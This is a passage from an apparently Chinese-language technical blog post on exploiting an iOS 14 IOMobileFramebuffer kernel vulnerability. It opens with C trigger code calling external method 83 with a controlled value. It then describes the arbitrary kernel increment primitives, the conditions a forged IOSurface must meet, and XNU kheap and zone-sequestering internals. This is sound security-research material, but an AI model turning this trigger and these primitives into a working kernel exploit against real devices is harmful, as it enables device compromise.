</span>&#123;</span><br><span class="line">  <span class="type">kern_return_t</span> ret;</span><br><span class="line">  <span class="type">io_connect_t</span> shared_user_client_conn = MACH_PORT_NULL;</span><br><span class="line">  <span class="type">int</span> type = <span class="number">2</span>;</span><br><span class="line">  <span class="type">io_service_t</span> service = <span class="built_in">IOServiceGetMatchingService</span>(kIOMasterPortDefault,</span><br><span class="line">                            <span class="built_in">IOServiceMatching</span>(<span class="string">&quot;IOMobileFramebuffer&quot;</span>));</span><br><span class="line">   </span><br><span class="line">  <span class="keyword">if</span>(service == MACH_PORT_NULL) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;failed to open service\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">   </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;service: 0x%x\n&quot;</span>, service);</span><br><span class="line"></span><br><span class="line">  ret = <span class="built_in">IOServiceOpen</span>(service, <span class="built_in">mach_task_self</span>(), type, &amp;shared_user_client_conn);</span><br><span class="line">  <span class="keyword">if</span>(ret != KERN_SUCCESS) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;failed to open userclient: %s\n&quot;</span>, <span class="built_in">mach_error_string</span>(ret));</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">   </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;client: 0x%x\n&quot;</span>, shared_user_client_conn);</span><br><span class="line">   </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;call externalMethod\n&quot;</span>);</span><br><span class="line">  <span class="type">uint64_t</span> scalars[<span class="number">4</span>] = &#123; <span class="number">0x0</span> &#125;;</span><br><span class="line">  scalars[<span class="number">0</span>] = <span class="number">0x41414141</span>;</span><br><span class="line"></span><br><span class="line">  <span class="type">uint64_t</span> output_scalars[<span class="number">4</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">  <span class="type">uint32_t</span> output_scalars_size = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;call s_default_fb_surface\n&quot;</span>);</span><br><span class="line">  ret = <span class="built_in">IOConnectCallMethod</span>(shared_user_client_conn, <span class="number">83</span>,</span><br><span class="line">            scalars, <span class="number">1</span>,</span><br><span class="line">    	      <span class="literal">NULL</span>, <span class="number">0</span>, <span class="comment">//input, input_size,</span></span><br><span class="line">    		    output_scalars, &amp;output_scalars_size,</span><br><span class="line">        	  <span class="literal">NULL</span>, <span class="literal">NULL</span>); <span class="comment">//output, &amp;output_size);</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(ret != KERN_SUCCESS) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;failed to call external method: 0x%x --&gt; %s\n&quot;</span>, ret, <span class="built_in">mach_error_string</span>(ret));</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">   </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;external method returned KERN_SUCCESS\n&quot;</span>);</span><br><span class="line">   </span><br><span class="line">  <span class="built_in">IOServiceClose</span>(shared_user_client_conn);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;success!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="踩坑经历"><a href="#踩坑经历" class="headerlink" title="踩坑经历"></a>踩坑经历</h1><p>iOS内核可以把任意一个对象解释为IOSurface</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">IOSurfaceSendRight *__fastcall <span class="title">IOSurfaceSendRight::init_IOSurfaceRoot___IOSurface</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        IOSurfaceSendRight *a1,</span></span></span><br><span class="line"><span class="params"><span class="function">        IOSurfaceRoot *a2,</span></span></span><br><span class="line"><span class="params"><span class="function">        IOSurface *oob_surface)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  IOSurfaceSendRight *v6; <span class="comment">// x20</span></span><br><span class="line">  IOSurface *surface; <span class="comment">// x21</span></span><br><span class="line"></span><br><span class="line">  v6 = OSObject::<span class="built_in">init</span>();</span><br><span class="line">  a1-&gt;m.surface_root = a2;</span><br><span class="line">  surface = a1-&gt;m.surface;</span><br><span class="line">  a1-&gt;m.surface = oob_surface;</span><br><span class="line">  <span class="keyword">if</span> ( oob_surface )</span><br><span class="line">    (oob_surface-&gt;retain)(oob_surface);</span><br><span class="line">  <span class="keyword">if</span> ( surface )</span><br><span class="line">    (surface-&gt;release_0)(surface);</span><br><span class="line">  IOSurface::<span class="built_in">clientRetain</span>(oob_surface);</span><br><span class="line">  IOSurface::<span class="built_in">increment_use_count</span>(oob_surface);</span><br><span class="line">  <span class="keyword">return</span> v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>IOSurface::clientRetain()</code>函数实现如下:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">SInt32 __fastcall <span class="title">IOSurface::clientRetain</span><span class="params">(IOSurface *surface)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">OSIncrementAtomic</span>(&amp;surface-&gt;client_retain_count);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> <code>IOSurface::increment_use_count()</code>函数实现如下:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __fastcall <span class="title">IOSurface::increment_use_count</span><span class="params">(IOSurface *surface)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">OSIncrementAtomic</span>((surface-&gt;qwordC0 + <span class="number">0x14LL</span>));</span><br><span class="line">    surface = surface-&gt;qword3F0;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( surface );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> 上面的代码中有两个原语:</p>
<ul>
<li>IOSurface::clientRetain会增加oob_surface指向的对象的偏移量为0x354(client_retain_count)处的值。</li>
<li>通过控制oob_surface的偏移量0xc0处的指针，IOSurface::increment_use_count在内核内存中提供了一个任意的32位增量。</li>
</ul>
<p>对于漏洞利用来讲，首先要伪造一个真实的IOSurface对象，否则会在 <code>IOSurfaceSendRight::init()</code>函数中导致Panic。因此伪造的IOSurface对象需要满足以下几点：</p>
<ol>
<li>oob_surface应该指向一个IOKit对象，因为IOSurfaceSendRight::init在其vtable上调用了偏移量为0x20的虚拟方法。只要oob_surface继承自OSObject，这就会调用 retain，这是一个无害的操作。</li>
<li>oob_surface的大小应该至少是0x358字节，因为IOSurface::clientRetain增加的字段是在偏移量0x354。如果oob_surface指向的对象小于这个大小，我们就有可能修改一个已释放的区域元素或碰到一个未映射的页面。</li>
<li>oob_surface必须有一个有效的内核指针，用于IOSurface::increment_use_count在偏移量0xc0。在偏移量0x3f0处，该指针可以是有效的，也可以是NULL。因此，ob_surface指向的对象应该大于0x3f8字节，原因与前一点相同。</li>
</ol>
<p>由于iOS 14通过引入kheaps和sequestering大大强化了内存分配器，因此，无论伪造的对象是否继承自OSObject，堆喷这个操作都存在着问题。</p>
<h2 id="kheaps"><a href="#kheaps" class="headerlink" title="kheaps"></a>kheaps</h2><p>在高层次上，Kheaps通过给数据、内核、kext和临时内存分配各自的kalloc.*区域，使得它们之间相互隔离。这些kheaps分别被称为KHEAP_DATA_BUFFERS、KHEAP_DEFAULT、KHEAP_KEXT和KHEAP_TEMP。</p>
<p>zone map实际上是由三个不同的子地图组成的。一个子图是KHEAP_DEFAULT、KHEAP_KEXT和KHEAP_TEMP的区域，而另一个是KHEAP_DATA_BUFFERS的区域。第三个子图对我们来说并不重要。KHEAP_DATA_BUFFERS是为那些内容为纯字节或由用户空间控制的分配而准备的。KHEAP_DEFAULT是XNU分配的Kheap，而KHEAP_KEXT是内核扩展分配的Kheap。KHEAP_TEMP（只是KHEAP_DEFAULT的别名）是指在系统调用中进行的分配，在返回EL0之前被释放。因此，在iOS 14及以上版本中，一个500字节的IOKit对象属于kext.kalloc.512，而一个同样大小的管道缓冲区则属于data.kalloc.512。在iOS 13及以下版本中，这两个分配都是kalloc.512。(在iOS 15上，似乎KHEAP_TEMP已经被移除）。</p>
<p>在iOS 13及以下版本中，滥用zone垃圾收集将一个页面从一个区域移动到另一个区域是利用UAF的标准。iOS 14管道缓冲区被隔离在数据缓冲区的Kheap中。通过管道缓冲区（或任何其他纯数据手段）喷射假的内核对象并希望通过垃圾收集 “重新利用 “这些页面已经行不通了。</p>
<h2 id="zone垃圾收集和封存"><a href="#zone垃圾收集和封存" class="headerlink" title="zone垃圾收集和封存"></a>zone垃圾收集和封存</h2><p>所有zone都有一个chunk size，表示一个虚拟内存连续的区域能被分割成多少个页。这个范围被称为 “chunk”。像<code>*.kalloc.192</code>这样较小的区域，其块的大小为一页。但是对于较大的区域，比如<code>*.kalloc.6144</code>，块的大小就会增加到2页，这是16k页面大小的设备的最大值。对于4k页面大小的设备，最大的块大小是8页。</p>
<p>与区块中每个页面相关的结构是<a target="_blank" rel="noopener" href="https://github.com/apple/darwin-xnu/blob/2ff845c2e033bd0ff64b5b6aa6063a1f8f65aa32/osfmk/kern/zalloc.c#L159">struct zone_page_metadata</a>:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">zone_page_metadata</span> &#123;</span><br><span class="line">	<span class="comment">/* 该元数据页所属区域的索引 */</span></span><br><span class="line">	<span class="type">zone_id_t</span>       zm_index : <span class="number">11</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Whether `zm_bitmap` is an inline bitmap or a packed bitmap reference */</span></span><br><span class="line">	<span class="type">uint16_t</span>        zm_inline_bitmap : <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * zone以zone_t::z_chunk_pages的&quot;chunk&quot;为单位进行分配</span></span><br><span class="line"><span class="comment">	 * 如果zone是percpu，则以zpercpu_count()页为单位</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * The first page of it has its metadata set with:</span></span><br><span class="line"><span class="comment">	 * - 0 if none of the pages are currently wired</span></span><br><span class="line"><span class="comment">	 * - the number of wired pages in the chunk (not scaled for percpu).</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * Other pages in the chunk have their zm_chunk_len set to</span></span><br><span class="line"><span class="comment">	 * ZM_SECONDARY_PAGE or ZM_SECONDARY_PCPU_PAGE depending on whether</span></span><br><span class="line"><span class="comment">	 * the zone is percpu or not. For those, zm_page_index holds the</span></span><br><span class="line"><span class="comment">	 * index of that page in the run.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">uint16_t</span>        zm_chunk_len : <span class="number">4</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZM_CHUNK_LEN_MAX        0x8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZM_SECONDARY_PAGE       0xe</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZM_SECONDARY_PCPU_PAGE  0xf</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">union</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZM_ALLOC_SIZE_LOCK      1u</span></span><br><span class="line">		<span class="type">uint16_t</span> zm_alloc_size; <span class="comment">/* first page only */</span></span><br><span class="line">		<span class="type">uint16_t</span> zm_page_index; <span class="comment">/* secondary pages only */</span></span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="keyword">union</span> &#123;</span><br><span class="line">		<span class="type">uint32_t</span> zm_bitmap;     <span class="comment">/* most zones */</span></span><br><span class="line">		<span class="type">uint32_t</span> zm_bump;       <span class="comment">/* permanent zones */</span></span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="type">zone_pva_t</span>      zm_page_next;</span><br><span class="line">	<span class="type">zone_pva_t</span>      zm_page_prev;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>如果一个zone page metadata结构与一个块中的第一页相关联，zm_chunk_len是zm_index（XNU的zone_array中的索引）所指的区域的块大小。如果块的大小超过一页，那么对于第二页及以后，zm_chunk_len被定义为ZM_SECONDARY_PAGE或ZM_SECONDARY_PAGE_PCPU_PAGE，并且zm_page_index作为该块的索引。否则，zm_alloc_size告诉我们该块中目前有多少字节被分配。zm_page_next和zm_page_prev一起工作，为zm_index的zone形成一个块的队列。如果一个zone的zone page metadata结构是这个大块队列的头，那么zm_page_prev持有一个由zone_queue_encode编码的值。如果它不是头部，两者都指向前一个&#x2F;下一个分块的第一页，但只有当它们所属的zone page metadata结构与分块中的第一页相关联时，才会如此。</p>
<p>所有的zone结构都带有指向zone page metadata结构的指针，每个指针都有不同的作用。在iOS 13及以下版本中，这些指针被称为all_free、intermediate和all_used。all_free维护一个只有自由元素的块队列，intermediate维护一个既有自由元素又有使用元素的块队列，而all_used维护一个只有使用元素的块队列。在iOS 14及以上版本中，它们分别被重新命名为empty、partial和full，但它们的用途保持不变。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/apple/darwin-xnu/blob/2ff845c2e033bd0ff64b5b6aa6063a1f8f65aa32/osfmk/kern/zalloc_internal.h#L234">zone</a>结构如下:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">zone</span> &#123;</span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">zone_pva_t</span>          z_pageq_empty;  <span class="comment">/* populated, completely empty pages   */</span></span><br><span class="line">    <span class="type">zone_pva_t</span>          z_pageq_partial;<span class="comment">/* populated, partially filled pages   */</span></span><br><span class="line">    <span class="type">zone_pva_t</span>          z_pageq_full;   <span class="comment">/* populated, completely full pages    */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://github.com/apple/darwin-xnu/blob/2ff845c2e033bd0ff64b5b6aa6063a1f8f65aa32/osfmk/kern/zalloc_internal.h#L114">zone_pva_t</a></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*!</span></span><br><span class="line"><span class="comment"> * @typedef zone_pva_t</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @brief</span></span><br><span class="line"><span class="comment"> * Type used to point to a page virtual address in the zone allocator.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @description</span></span><br><span class="line"><span class="comment"> * - Valid pages have the top bit set.</span></span><br><span class="line"><span class="comment"> * - 0 represents the &quot;NULL&quot; page</span></span><br><span class="line"><span class="comment"> * - non 0 values with the top bit cleared do not represent any valid page.</span></span><br><span class="line"><span class="comment"> *   the zone freelists use this space to encode &quot;queue&quot; addresses.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">zone_packed_virtual_address</span> &#123;</span><br><span class="line">	<span class="type">uint32_t</span> packed_address;</span><br><span class="line">&#125; <span class="type">zone_pva_t</span>;</span><br></pre></td></tr></table></figure>

<p>一个zone打包的虚拟地址实际上只是<a target="_blank" rel="noopener" href="https://github.com/apple/darwin-xnu/blob/2ff845c2e033bd0ff64b5b6aa6063a1f8f65aa32/osfmk/kern/zalloc_internal.h#L109">内核指针</a>的Bits[49:14]，并有一些特殊的规则:</p>
<ul>
<li>(zone_pva_t)0代表零页（又称NULL）。</li>
<li>zone_pva_t的最高位被设置，可以通过将其移到左边的14位并进行符号扩展来转换回其对应的页对齐的内核指针。</li>
<li>一个zone_pva_t的顶位被清除，代表一个队列地址。</li>
</ul>
<p>这样做的好处是，你可以将一个非队列的zone_pva_t转换回其对应的zone page metadata结构，反之亦然，分别使用zone_pva_to_meta和zone_pva_from_meta。不仅如此，一旦我们有了一个指向zone page metadata结构的指针，我们就可以通过调用zone_meta_to_addr来得出它所关联的块中的页面。例如，<code>zone_pva_to_meta(z-&gt;z_pageq_empty)</code>将返回表示z所指向的区的空队列的头的zone page metadata结构。</p>
<p>属于某个zone的所有块被布置成网格中的盒子，每个盒子代表一个块。从一个块到一个metadata结构的虚线箭头表示这两者之间的联系。假设三个深绿色的块在前面描述的一个队列的中间有背对背的zone_page_metadata条目，我们会有这样的东西。</p>
<p><img src="https://jsherman212.github.io/assets/popping_ios14_with_iomfb/metadata_chunk_relationship.png"></p>
<p><a target="_blank" rel="noopener" href="https://github.com/apple/darwin-xnu/blob/2ff845c2e033bd0ff64b5b6aa6063a1f8f65aa32/osfmk/kern/zalloc.c#L6529">zone_gc</a>是zone垃圾收集的入口，它调用zone_reclaim_all，zone_reclaim_all负责在每个zone上调用zone_reclaim，有趣的部分从zone_reclaim的结尾开始:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(;;)&#123;</span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (zone_pva_is_null(z-&gt;z_pageq_empty)) &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  	<span class="comment">// 将只有空闲元素的页面释放回给区域分配器</span></span><br><span class="line">    meta  = zone_pva_to_meta(z-&gt;z_pageq_empty); </span><br><span class="line">    count = (<span class="type">uint32_t</span>)ptoa(meta-&gt;zm_chunk_len) / zone_elem_size(z);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (z-&gt;z_elems_free - count &lt; goal) &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    zone_reclaim_chunk(z, meta, count);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://github.com/apple/darwin-xnu/blob/2ff845c2e033bd0ff64b5b6aa6063a1f8f65aa32/osfmk/kern/zalloc.c#L6173">zone_reclaim_chunk</a>弹出从z-&gt;z_pageq_empty传递给它的zone page metadata:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">zone_reclaim_chunk</span><span class="params">(<span class="type">zone_t</span> z, <span class="keyword">struct</span> zone_page_metadata *meta, <span class="type">uint32_t</span> free_count)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* Declaring variables */</span></span><br><span class="line"></span><br><span class="line">    zone_meta_queue_pop_native(z, &amp;z-&gt;z_pageq_empty, &amp;page_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ... */</span></span><br></pre></td></tr></table></figure>

<p>在<a target="_blank" rel="noopener" href="https://github.com/apple/darwin-xnu/blob/2ff845c2e033bd0ff64b5b6aa6063a1f8f65aa32/osfmk/kern/zalloc.c#L6258">zone_reclaim_chunk</a>的结尾:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (sequester) &#123;</span><br><span class="line">    kernel_memory_depopulate(zone_submap(z), page_addr,</span><br><span class="line">        size_to_free, KMA_KOBJECT, VM_KERN_MEMORY_ZONE);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    kmem_free(zone_submap(z), page_addr, ptoa(z-&gt;z_chunk_pages));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同样，对于KHEAP_DEFAULT和KHEAP_KEXT来说，sequester将永远是真的。kmem_free释放的是块和支持该块的物理内存，而kernel_memory_depopulate只释放物理内存。在往下:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (sequester) &#123;</span><br><span class="line">    zone_meta_queue_push(z, &amp;z-&gt;z_pageq_va, meta);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>刚刚填充的区块的页面元数据被推送到一个叫做z_pageq_va的队列中。这个队列在iOS 14中首次出现，它位于zone结构中z_pageq_full之后。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zone</span> &#123;</span></span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">zone_pva_t</span>          z_pageq_empty;  <span class="comment">/* populated, completely empty pages   */</span></span><br><span class="line">    <span class="type">zone_pva_t</span>          z_pageq_partial;<span class="comment">/* populated, partially filled pages   */</span></span><br><span class="line">    <span class="type">zone_pva_t</span>          z_pageq_full;   <span class="comment">/* populated, completely full pages    */</span></span><br><span class="line">    <span class="type">zone_pva_t</span>          z_pageq_va;     <span class="comment">/* non-populated VA pages              */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>z_pageq_va将会被 <a target="_blank" rel="noopener" href="https://github.com/apple/darwin-xnu/blob/2ff845c2e033bd0ff64b5b6aa6063a1f8f65aa32/osfmk/kern/zalloc.c#L4535"><code>zone_expand_locked()</code></a>函数使用.如果一个zone的空闲元素开始耗尽，这个函数就会被调用来重新填充该zone。它所做的第一件事就是看是否可以重新使用z_pageq_va中的一个被删除的块。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!zone_pva_is_null(z-&gt;z_pageq_va)) &#123;</span><br><span class="line">    meta = zone_meta_queue_pop_native(z,</span><br><span class="line">        &amp;z-&gt;z_pageq_va, &amp;addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (meta-&gt;zm_chunk_len == ZM_SECONDARY_PAGE) &#123;</span><br><span class="line">        cur_pages = meta-&gt;zm_page_index;</span><br><span class="line">        meta -= cur_pages;</span><br><span class="line">        addr -= ptoa(cur_pages);</span><br><span class="line">        zone_meta_lock_in_partial(z, meta, cur_pages);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果我们把注意力转移到<a target="_blank" rel="noopener" href="https://github.com/apple/darwin-xnu/blob/2ff845c2e033bd0ff64b5b6aa6063a1f8f65aa32/osfmk/kern/zalloc.c#L4635">zone_expand_locked</a>上，我们会看到XNU试图用vm_page_grab抓取足够的空闲页来满足min_pages，而不是满足zone z的chunk大小。min_pages是z的元素大小，四舍五入到最近的页。这就是后来可能产生部分填充的块的原因，因为这里没有任何东西强制要求为addr所属的块中的每个页面分配一个空闲页。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (pages &lt; z-&gt;z_chunk_pages - cur_pages) &#123;</span><br><span class="line">    <span class="type">vm_page_t</span> m = vm_page_grab();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (m) &#123;</span><br><span class="line">        pages++;</span><br><span class="line">        m-&gt;vmp_snext = page_list;</span><br><span class="line">        page_list = m;</span><br><span class="line">        vm_page_zero_fill(m);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pages &gt;= min_pages &amp;&amp; (vm_pool_low() || waited)) &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来，调用kernel_memory_populate_with_pages来重新映射最近被释放的z_pageq_va块的虚拟内存到支持刚刚被分配的自由页的物理内存上。然而，如果XNU不能分配足够的空闲页来满足该块的长度，那么在kernel_memory_populate_with_pages返回后，该块中的一些页将继续被释放，产生一个部分填充的块。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kernel_memory_populate_with_pages(zone_submap(z),</span><br><span class="line">    addr + ptoa(cur_pages), ptoa(pages), page_list,</span><br><span class="line">    zone_kma_flags(z, flags), VM_KERN_MEMORY_ZONE);</span><br></pre></td></tr></table></figure>

<p>最后，<a target="_blank" rel="noopener" href="https://github.com/apple/darwin-xnu/blob/2ff845c2e033bd0ff64b5b6aa6063a1f8f65aa32/osfmk/kern/zalloc.c#L4373">zcram_and_lock</a>被调用。这个函数负责使被重新映射的块再次可用于一个区域。如果这个区块最终被部分填充，它将确保被填充的页面能够回到z_pageq_va中。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pg_end &lt; chunk_pages) &#123;</span><br><span class="line">    <span class="comment">/* push any non populated residual VA on z_pageq_va */</span></span><br><span class="line">    zone_meta_queue_push(zone, &amp;zone-&gt;z_pageq_va, meta + pg_end);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ... */</span></span><br></pre></td></tr></table></figure>

